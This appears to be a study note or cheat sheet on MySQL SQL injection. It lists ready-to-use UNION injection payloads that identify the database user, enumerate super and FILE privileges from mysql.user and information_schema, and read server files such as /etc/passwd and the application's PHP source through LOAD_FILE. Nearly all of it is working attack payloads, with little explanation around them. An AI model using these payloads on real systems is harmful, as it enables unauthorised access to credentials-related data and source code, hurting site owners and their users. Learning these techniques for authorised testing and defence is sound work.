## Privileges

Privileges to read files are much more common than to write files.

### DB User

It might be that only the database administrator (DBA) has rights to read data, so if we are not that user we need to check are privileges.

Queries to find the current DB user:
```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

The UNION injection payload with 1 of the queries:
```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

### User Privileges

Check for super admin privileges:
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

We can also check for a specific user:
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

It will return 'Y' if we do have super admin privileges.

Dump other privileges:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

For a specific user:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

If we see the FILE privilege it means we can read files and potentially write files.

## LOAD_FILE

Read a file:
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

Another example to read the source code:
```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

You can find the PHP code in the source code.